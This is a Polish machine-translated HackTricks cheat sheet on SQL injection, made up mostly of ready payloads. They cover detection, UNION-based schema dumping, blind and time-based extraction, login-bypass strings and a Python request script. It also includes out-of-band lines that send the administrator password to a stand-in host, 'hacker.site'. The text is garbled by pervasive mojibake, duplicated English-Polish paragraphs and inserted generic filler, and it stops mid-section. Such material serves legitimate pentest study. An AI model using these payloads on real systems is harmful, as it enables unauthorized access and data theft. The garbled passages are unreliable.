# Wstrzykiwanie SQL

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmujÄ…cej siÄ™ cyberbezpieczeÅ„stwem**? Chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks**? A moÅ¼e chcesz mieÄ‡ dostÄ™p do **najnowszej wersji PEASS lub pobraÄ‡ HackTricks w formacie PDF**? SprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* **DoÅ‚Ä…cz do** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** mnie na **Twitterze** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. MajÄ…c na celu promowanie wiedzy technicznej, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w technologii i cyberbezpieczeÅ„stwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## Czym jest wstrzykiwanie SQL?

**Wstrzykiwanie SQL** to luka w zabezpieczeniach, ktÃ³ra umoÅ¼liwia atakujÄ…cym **interferowanie w zapytania do bazy danych** aplikacji. Ta podatnoÅ›Ä‡ moÅ¼e umoÅ¼liwiÄ‡ atakujÄ…cym **wyÅ›wietlanie**, **modyfikowanie** lub **usuwanie** danych, do ktÃ³rych nie powinni mieÄ‡ dostÄ™pu, w tym informacji innych uÅ¼ytkownikÃ³w lub dowolnych danych, do ktÃ³rych aplikacja ma dostÄ™p. Takie dziaÅ‚ania mogÄ… prowadziÄ‡ do trwaÅ‚ych zmian w funkcjonalnoÅ›ci lub treÅ›ci aplikacji, a nawet do skompromitowania serwera lub odmowy usÅ‚ugi.

## Wykrywanie punktu wejÅ›cia

Gdy strona wydaje siÄ™ **podatna na wstrzykiwanie SQL (SQLi)** ze wzglÄ™du na nietypowe odpowiedzi serwera na wprowadzane dane zwiÄ…zane z SQLi, **pierwszym krokiem** jest zrozumienie, jak **wstrzyknÄ…Ä‡ dane do zapytania bez zakÅ‚Ã³cania go**. Wymaga to zidentyfikowania metody **ucieczki z bieÅ¼Ä…cego kontekstu**. Oto kilka przykÅ‚adÃ³w przydatnych technik:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
NastÄ™pnie musisz wiedzieÄ‡, jak **naprawiÄ‡ zapytanie, aby nie byÅ‚o bÅ‚Ä™dÃ³w**. Aby naprawiÄ‡ zapytanie, moÅ¼esz **wprowadziÄ‡** dane, aby **poprzednie zapytanie zaakceptowaÅ‚o nowe dane**, lub po prostu **wprowadziÄ‡** swoje dane i **dodaÄ‡ symbol komentarza na koÅ„cu**.

_ZauwaÅ¼, Å¼e jeÅ›li widzisz komunikaty o bÅ‚Ä™dach lub zauwaÅ¼asz rÃ³Å¼nice miÄ™dzy dziaÅ‚ajÄ…cym a niedziaÅ‚ajÄ…cym zapytaniem, ta faza bÄ™dzie Å‚atwiejsza._

### **Komentarze**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Potwierdzanie za pomocÄ… operacji logicznych

NiezawodnÄ… metodÄ… potwierdzenia podatnoÅ›ci na SQL injection jest wykonanie **operacji logicznej** i obserwacja oczekiwanych wynikÃ³w. Na przykÅ‚ad, parametr GET taki jak `?username=Peter`, ktÃ³ry daje identyczne treÅ›ci po zmodyfikowaniu na `?username=Peter' or '1'='1`, wskazuje na podatnoÅ›Ä‡ na SQL injection.

Podobnie, zastosowanie **operacji matematycznych** sÅ‚uÅ¼y jako skuteczna technika potwierdzania. Na przykÅ‚ad, jeÅ›li dostÄ™p do `?id=1` i `?id=2-1` daje ten sam wynik, wskazuje to na SQL injection.

PrzykÅ‚ady potwierdzania za pomocÄ… operacji logicznych:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Ta lista sÅ‚Ã³w zostaÅ‚a stworzona w celu **potwierdzenia wystÄ…pienia SQL Injection** w proponowany sposÃ³b:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Potwierdzanie za pomocÄ… opÃ³ÅºnieÅ„

W niektÃ³rych przypadkach **nie zauwaÅ¼ysz Å¼adnej zmiany** na stronie, ktÃ³rÄ… testujesz. Dlatego dobrym sposobem na **odkrycie Å›lepych SQL Injection** jest spowodowanie, Å¼e baza danych wykona dziaÅ‚ania, ktÃ³re wpÅ‚ynÄ… na czas Å‚adowania strony.\
W zwiÄ…zku z tym, do zapytania SQL dodamy operacjÄ™, ktÃ³ra zajmie duÅ¼o czasu na wykonanie:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
W niektÃ³rych przypadkach **nie bÄ™dzie dozwolone uÅ¼ycie funkcji sleep**. W takim przypadku, zamiast korzystaÄ‡ z tych funkcji, moÅ¼na wykonaÄ‡ zapytanie, ktÃ³re **wykona skomplikowane operacje** i zajmie kilka sekund. _PrzykÅ‚ady tych technik zostanÄ… omÃ³wione oddzielnie dla kaÅ¼dej technologii (jeÅ›li istniejÄ…)_.

### Identyfikacja Back-endu

Najlepszym sposobem na zidentyfikowanie back-endu jest prÃ³ba wykonania funkcji rÃ³Å¼nych back-endÃ³w. MoÅ¼na uÅ¼yÄ‡ funkcji _**sleep**_ z poprzedniej sekcji lub tych (tabela z [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Dodatkowo, jeÅ›li masz dostÄ™p do wynikÃ³w zapytania, moÅ¼esz sprawiÄ‡, Å¼eby **wyÅ›wietlaÅ‚o wersjÄ™ bazy danych**.

{% hint style="info" %}
W dalszej czÄ™Å›ci omÃ³wimy rÃ³Å¼ne metody wykorzystania rÃ³Å¼nych rodzajÃ³w SQL Injection. Jako przykÅ‚ad bÄ™dziemy uÅ¼ywaÄ‡ MySQL.
{% endhint %}

### Identyfikacja za pomocÄ… PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Wykorzystywanie Union Based

### Wykrywanie liczby kolumn

JeÅ›li moÅ¼esz zobaczyÄ‡ wyniki zapytania, to jest najlepszy sposÃ³b na jego wykorzystanie.\
Przede wszystkim musimy dowiedzieÄ‡ siÄ™, ile **kolumn** zwraca **poczÄ…tkowe zapytanie**. Jest to konieczne, poniewaÅ¼ **oba zapytania muszÄ… zwracaÄ‡ tÄ™ samÄ… liczbÄ™ kolumn**.\
Do tego celu zwykle stosuje siÄ™ dwie metody:

#### Order/Group by

Aby okreÅ›liÄ‡ liczbÄ™ kolumn w zapytaniu, stopniowo dostosowuj liczbÄ™ uÅ¼ywanÄ… w klauzulach **ORDER BY** lub **GROUP BY**, aÅ¼ otrzymasz faÅ‚szywÄ… odpowiedÅº. Pomimo rÃ³Å¼nych funkcjonalnoÅ›ci **GROUP BY** i **ORDER BY** w SQL, obie mogÄ… byÄ‡ uÅ¼ywane w identyczny sposÃ³b do okreÅ›lenia liczby kolumn w zapytaniu.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Wybierz coraz wiÄ™cej wartoÅ›ci null, aÅ¼ zapytanie bÄ™dzie poprawne:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_NaleÅ¼y uÅ¼ywaÄ‡ wartoÅ›ci `null`, poniewaÅ¼ w niektÃ³rych przypadkach typy kolumn po obu stronach zapytania muszÄ… byÄ‡ takie same, a null jest waÅ¼ny w kaÅ¼dym przypadku._

### WyodrÄ™bnianie nazw baz danych, nazw tabel i nazw kolumn

W poniÅ¼szych przykÅ‚adach wyodrÄ™bniamy nazwÄ™ wszystkich baz danych, nazwÄ™ tabeli z bazy danych oraz nazwy kolumn w tabeli:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Istnieje rÃ³Å¼ny sposÃ³b na odkrycie tych danych w kaÅ¼dej bazie danych, ale zawsze stosuje siÄ™ tÄ™ samÄ… metodologiÄ™._

## Wykorzystywanie ukrytego wstrzykiwania opartego na unii

Gdy wynik zapytania jest widoczny, ale wstrzykiwanie oparte na unii wydaje siÄ™ niemoÅ¼liwe, oznacza to obecnoÅ›Ä‡ **ukrytego wstrzykiwania opartego na unii**. Ten scenariusz czÄ™sto prowadzi do sytuacji Å›lepego wstrzykiwania. Aby przeksztaÅ‚ciÄ‡ Å›lepe wstrzykiwanie w wstrzykiwanie oparte na unii, naleÅ¼y rozpoznaÄ‡ zapytanie wykonujÄ…ce siÄ™ po stronie serwera.

MoÅ¼na to osiÄ…gnÄ…Ä‡ poprzez wykorzystanie technik Å›lepego wstrzykiwania wraz z domyÅ›lnymi tabelami specyficznymi dla docelowego systemu zarzÄ…dzania bazÄ… danych (DBMS). W celu zrozumienia tych domyÅ›lnych tabel, zaleca siÄ™ zapoznanie siÄ™ z dokumentacjÄ… docelowego DBMS.

Po wydobyciu zapytania konieczne jest dostosowanie Å‚adunku uÅ¼ywanego do bezpiecznego zamkniÄ™cia oryginalnego zapytania. NastÄ™pnie do Å‚adunku doÅ‚Ä…czane jest zapytanie unii, uÅ‚atwiajÄ…ce wykorzystanie nowo dostÄ™pnego wstrzykiwania opartego na unii.

Aby uzyskaÄ‡ bardziej szczegÃ³Å‚owe informacje, zapoznaj siÄ™ z kompletnym artykuÅ‚em dostÄ™pnym pod adresem [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Wykorzystywanie bÅ‚Ä™dÃ³w

JeÅ›li z jakiegoÅ› powodu **nie moÅ¼esz** zobaczyÄ‡ **wyniku** zapytania, ale moÅ¼esz zobaczyÄ‡ **komunikaty o bÅ‚Ä™dach**, moÅ¼esz wykorzystaÄ‡ te komunikaty o bÅ‚Ä™dach do **wycieku** danych z bazy danych.\
PostÄ™pujÄ…c podobnie jak w przypadku wykorzystywania wstrzykiwania opartego na unii, moÅ¼esz zdoÅ‚aÄ‡ wydobyÄ‡ bazÄ™ danych.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Wykorzystywanie Blind SQLi

W tym przypadku nie moÅ¼esz zobaczyÄ‡ wynikÃ³w zapytania ani bÅ‚Ä™dÃ³w, ale moÅ¼esz **rozrÃ³Å¼niÄ‡**, kiedy zapytanie **zwraca** odpowiedÅº **true** lub **false**, poniewaÅ¼ na stronie sÄ… rÃ³Å¼ne treÅ›ci.\
W tym przypadku moÅ¼esz wykorzystaÄ‡ to zachowanie, aby wyciÄ…gnÄ…Ä‡ bazÄ™ danych znak po znaku:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Wykorzystywanie Error Blind SQLi

To jest **ten sam przypadek co wczeÅ›niej**, ale zamiast rozrÃ³Å¼niaÄ‡ miÄ™dzy odpowiedziÄ… prawdziwÄ…/faÅ‚szywÄ… z zapytania, moÅ¼emy **rozrÃ³Å¼niÄ‡ miÄ™dzy** bÅ‚Ä™dem w zapytaniu SQL a jego brakiem (moÅ¼e to byÄ‡ spowodowane awariÄ… serwera HTTP). W zwiÄ…zku z tym, w tym przypadku moÅ¼emy wymusiÄ‡ bÅ‚Ä…d SQL za kaÅ¼dym razem, gdy poprawnie zgadniemy znak:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Wykorzystywanie opÃ³ÅºnieÅ„ w SQLi

W tym przypadku **nie ma** sposobu, aby **rozrÃ³Å¼niÄ‡** odpowiedÅº zapytania na podstawie kontekstu strony. Jednak, moÅ¼esz sprawiÄ‡, Å¼e strona **bÄ™dzie dÅ‚uÅ¼ej siÄ™ Å‚adowaÄ‡**, jeÅ›li zgadniÄ™ty znak jest poprawny. JuÅ¼ wczeÅ›niej widzieliÅ›my wykorzystanie tej techniki w celu [potwierdzenia podatnoÅ›ci na SQLi](./#potwierdzanie-z-wykorzystaniem-opÃ³ÅºnieÅ„).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Zapytania zagnieÅ¼dÅ¼one

MoÅ¼esz uÅ¼yÄ‡ zapytaÅ„ zagnieÅ¼dÅ¼onych, aby **wykonaÄ‡ wiele zapytaÅ„ kolejno**. NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e podczas wykonywania kolejnych zapytaÅ„, **wyniki nie sÄ… zwracane do aplikacji**. Dlatego ta technika jest gÅ‚Ã³wnie przydatna w przypadku **Å›lepych podatnoÅ›ci**, gdzie moÅ¼na uÅ¼yÄ‡ drugiego zapytania do wywoÅ‚ania wyszukiwania DNS, bÅ‚Ä™du warunkowego lub opÃ³Åºnienia czasowego.

**Oracle** nie obsÅ‚uguje **zapytaÅ„ zagnieÅ¼dÅ¼onych**. **MySQL, Microsoft** i **PostgreSQL** je obsÅ‚ugujÄ…: `ZAPYTANIE-1-TUTAJ; ZAPYTANIE-2-TUTAJ`

## Wykorzystanie poza pasmem

JeÅ›li **Å¼adna inna** metoda eksploatacji **nie zadziaÅ‚a**, moÅ¼esz sprÃ³bowaÄ‡ sprawiÄ‡, aby **baza danych wyciekÅ‚a** informacje do **zewnÄ™trznego hosta** kontrolowanego przez ciebie. Na przykÅ‚ad, za pomocÄ… zapytaÅ„ DNS:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Wyciek danych poza pasmem za pomocÄ… XXE

XXE (ang. XML External Entity) to atak, ktÃ³ry wykorzystuje podatnoÅ›Ä‡ w przetwarzaniu danych XML, umoÅ¼liwiajÄ…c wyciek informacji z systemu docelowego. W przypadku ataku XXE, atakujÄ…cy moÅ¼e wykorzystaÄ‡ funkcjÄ™ analizy danych XML, aby zaÅ‚adowaÄ‡ zewnÄ™trzne encje, ktÃ³re zawierajÄ… poufne informacje. JednÄ… z metod wykorzystywanych w ataku XXE jest wyciek danych poza pasmem (ang. out of band data exfiltration).

Wyciek danych poza pasmem polega na przesyÅ‚aniu skradzionych informacji z systemu docelowego do kontrolowanego przez atakujÄ…cego serwera zewnÄ™trznego. W przypadku ataku XXE, atakujÄ…cy moÅ¼e wykorzystaÄ‡ funkcjÄ™ analizy danych XML do wysÅ‚ania Å¼Ä…dania HTTP do kontrolowanego przez siebie serwera zewnÄ™trznego, zawierajÄ…cego skradzione dane. AtakujÄ…cy moÅ¼e nastÄ™pnie monitorowaÄ‡ serwer zewnÄ™trzny, aby uzyskaÄ‡ dostÄ™p do skradzionych informacji.

Aby przeprowadziÄ‡ atak XXE z wyciekiem danych poza pasmem, atakujÄ…cy musi znaleÅºÄ‡ podatne miejsce w aplikacji, gdzie moÅ¼na wstrzyknÄ…Ä‡ zÅ‚oÅ›liwy kod XML. NastÄ™pnie atakujÄ…cy moÅ¼e wykorzystaÄ‡ zewnÄ™trzne encje XML, aby zaÅ‚adowaÄ‡ dane z systemu docelowego i przesÅ‚aÄ‡ je do kontrolowanego przez siebie serwera zewnÄ™trznego.

Atak XXE z wyciekiem danych poza pasmem jest szczegÃ³lnie niebezpieczny, poniewaÅ¼ atakujÄ…cy moÅ¼e uniknÄ…Ä‡ wykrycia przez systemy zabezpieczeÅ„, ktÃ³re monitorujÄ… tylko ruch sieciowy. Ponadto, atakujÄ…cy moÅ¼e wykorzystaÄ‡ tÄ™ technikÄ™ do przesyÅ‚ania danych przez protokoÅ‚y, ktÃ³re nie sÄ… zwykle uÅ¼ywane do przesyÅ‚ania informacji, takie jak DNS lub FTP.

Aby zabezpieczyÄ‡ aplikacjÄ™ przed atakiem XXE z wyciekiem danych poza pasmem, naleÅ¼y:

- UnikaÄ‡ analizy danych XML z niezaufanego ÅºrÃ³dÅ‚a.
- WyÅ‚Ä…czyÄ‡ obsÅ‚ugÄ™ zewnÄ™trznych encji XML.
- SkonfigurowaÄ‡ serwer XML w taki sposÃ³b, aby nie przetwarzaÅ‚ zewnÄ™trznych encji.
- Regularnie aktualizowaÄ‡ oprogramowanie, aby uniknÄ…Ä‡ podatnoÅ›ci na ataki XXE.

PamiÄ™taj, Å¼e ataki XXE mogÄ… byÄ‡ bardzo niebezpieczne i mogÄ… prowadziÄ‡ do wycieku poufnych informacji. Dlatego waÅ¼ne jest, aby zabezpieczyÄ‡ aplikacje przed tÄ… podatnoÅ›ciÄ… i regularnie testowaÄ‡ ich bezpieczeÅ„stwo.
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Automatyczne wykorzystanie

SprawdÅº [SQLMap Cheetsheat](sqlmap/), aby wykorzystaÄ‡ podatnoÅ›Ä‡ SQLi za pomocÄ… [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informacje specyficzne dla technologii

OmÃ³wiliÅ›my juÅ¼ wszystkie sposoby wykorzystania podatnoÅ›ci SQL Injection. ZnajdÅº wiÄ™cej sztuczek zaleÅ¼nych od technologii bazodanowej w tej ksiÄ…Å¼ce:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Lub znajdziesz **wiele sztuczek dotyczÄ…cych: MySQL, PostgreSQL, Oracle, MSSQL, SQLite i HQL w** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) to najwaÅ¼niejsze wydarzenie zwiÄ…zane z cyberbezpieczeÅ„stwem w **Hiszpanii** i jedno z najwaÅ¼niejszych w **Europie**. MajÄ…c **misjÄ™ promowania wiedzy technicznej**, ten kongres jest gorÄ…cym punktem spotkaÅ„ dla profesjonalistÃ³w technologii i cyberbezpieczeÅ„stwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## OminiÄ™cie uwierzytelniania

Lista prÃ³b ominiÄ™cia funkcjonalnoÅ›ci logowania:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### OminiÄ™cie uwierzytelniania za pomocÄ… surowego skrÃ³tu
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Ten zapytanie prezentuje podatnoÅ›Ä‡, gdy MD5 jest uÅ¼ywane z wartoÅ›ciÄ… true dla surowego wyjÅ›cia w sprawdzaniu uwierzytelniania, co czyni system podatnym na atak SQL injection. AtakujÄ…cy mogÄ… wykorzystaÄ‡ to, tworzÄ…c dane wejÅ›ciowe, ktÃ³re po zahashowaniu generujÄ… nieoczekiwane czÄ™Å›ci polecenia SQL, prowadzÄ…c do nieautoryzowanego dostÄ™pu.
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### Bypass uwierzytelniania za pomocÄ… wstrzykniÄ™tego skrÃ³tu

W przypadku niektÃ³rych aplikacji internetowych, ktÃ³re przechowujÄ… hasÅ‚a w formie skrÃ³tu (hash), moÅ¼na prÃ³bowaÄ‡ obejÅ›Ä‡ proces uwierzytelniania, wstrzykujÄ…c odpowiedni skrÃ³t. JeÅ›li aplikacja nie wykonuje odpowiednich sprawdzeÅ„, moÅ¼e dopuÅ›ciÄ‡ do zalogowania siÄ™ bez podawania prawidÅ‚owego hasÅ‚a.

Aby to zrobiÄ‡, naleÅ¼y znaleÅºÄ‡ sposÃ³b na wstrzykniÄ™cie skrÃ³tu w odpowiednie pole uwierzytelniania. MoÅ¼na to zrobiÄ‡ poprzez manipulacjÄ™ parametrami Å¼Ä…dania lub formularza logowania.

Warto zauwaÅ¼yÄ‡, Å¼e ta technika moÅ¼e byÄ‡ skuteczna tylko wtedy, gdy aplikacja nie wykonuje dodatkowych sprawdzeÅ„, takich jak sprawdzanie integralnoÅ›ci skrÃ³tu lub porÃ³wnywanie go z przechowywanym hasÅ‚em.

NaleÅ¼y jednak pamiÄ™taÄ‡, Å¼e wstrzykniÄ™cie skrÃ³tu jest nieetyczne i nielegalne. Tylko w przypadku legalnych testÃ³w penetracyjnych moÅ¼na uÅ¼ywaÄ‡ tej techniki.
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Zalecana lista**:

Jako nazwÄ™ uÅ¼ytkownika powinieneÅ› uÅ¼yÄ‡ kaÅ¼dej linii z listy, a jako hasÅ‚o zawsze: _**Pass1234.**_\
_(Te payloady sÄ… rÃ³wnieÅ¼ zawarte w duÅ¼ej liÅ›cie wspomnianej na poczÄ…tku tej sekcji)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Bypass uwierzytelniania

JeÅ›li ' jest unikane, moÅ¼esz uÅ¼yÄ‡ %A8%27, a kiedy ' jest unikane, zostanie utworzone: 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Skrypt Pythona:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Wielokontekstowy wstrzykniÄ™cie (poliglotyczne)

Polyglot injection, also known as multicontext injection, is a technique used in SQL injection attacks. It involves crafting a payload that can be interpreted as valid code in multiple contexts, such as SQL, XML, or JavaScript. This allows the attacker to exploit vulnerabilities in different parts of the application that handle different types of input.

Wielokontekstowe wstrzykniÄ™cie, znane rÃ³wnieÅ¼ jako wstrzykniÄ™cie poliglotyczne, to technika stosowana w atakach SQL injection. Polega ona na tworzeniu Å‚adunku, ktÃ³ry moÅ¼e byÄ‡ interpretowany jako poprawny kod w wielu kontekstach, takich jak SQL, XML lub JavaScript. Pozwala to atakujÄ…cemu wykorzystaÄ‡ podatnoÅ›ci w rÃ³Å¼nych czÄ™Å›ciach aplikacji, ktÃ³re obsÅ‚ugujÄ… rÃ³Å¼ne rodzaje danych wejÅ›ciowych.

The advantage of using polyglot injection is that it increases the chances of successfully exploiting a vulnerability, as the payload can be effective in multiple contexts. It also makes it more difficult for security measures, such as input validation or filtering, to detect and block the malicious code.

ZaletÄ… stosowania wstrzykniÄ™cia poliglotycznego jest zwiÄ™kszenie szans na skuteczne wykorzystanie podatnoÅ›ci, poniewaÅ¼ Å‚adunek moÅ¼e byÄ‡ skuteczny w wielu kontekstach. Utrudnia to rÃ³wnieÅ¼ wykrycie i zablokowanie zÅ‚oÅ›liwego kodu przez Å›rodki bezpieczeÅ„stwa, takie jak walidacja lub filtrowanie danych wejÅ›ciowych.

To perform a polyglot injection, the attacker needs to carefully craft the payload to ensure that it is valid in multiple contexts. This requires a deep understanding of the different syntax and rules of each context. The attacker also needs to identify the vulnerable parts of the application and determine the appropriate context to exploit.

Aby przeprowadziÄ‡ wstrzykniÄ™cie poliglotyczne, atakujÄ…cy musi starannie opracowaÄ‡ Å‚adunek, aby upewniÄ‡ siÄ™, Å¼e jest on poprawny w wielu kontekstach. Wymaga to dogÅ‚Ä™bnego zrozumienia rÃ³Å¼nych skÅ‚adni i zasad kaÅ¼dego kontekstu. AtakujÄ…cy musi rÃ³wnieÅ¼ zidentyfikowaÄ‡ podatne czÄ™Å›ci aplikacji i okreÅ›liÄ‡ odpowiedni kontekst do wykorzystania.

It is important to note that polyglot injection is a complex technique that requires advanced knowledge and skills in hacking. It should only be used for ethical purposes, such as penetration testing, with proper authorization.

Warto zauwaÅ¼yÄ‡, Å¼e wstrzykniÄ™cie poliglotyczne to zaawansowana technika, ktÃ³ra wymaga zaawansowanej wiedzy i umiejÄ™tnoÅ›ci w dziedzinie hakowania. Powinna byÄ‡ stosowana wyÅ‚Ä…cznie w celach etycznych, takich jak testowanie penetracyjne, z odpowiedniÄ… autoryzacjÄ….
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Instrukcja Insert

### Zmiana hasÅ‚a istniejÄ…cego obiektu/uÅ¼ytkownika

Aby to zrobiÄ‡, sprÃ³buj **utworzyÄ‡ nowy obiekt o nazwie "obiekt gÅ‚Ã³wny"** (prawdopodobnie **admin** w przypadku uÅ¼ytkownikÃ³w), modyfikujÄ…c coÅ›:

* UtwÃ³rz uÅ¼ytkownika o nazwie: **AdMIn** (duÅ¼e i maÅ‚e litery)
* UtwÃ³rz uÅ¼ytkownika o nazwie: **admin=**
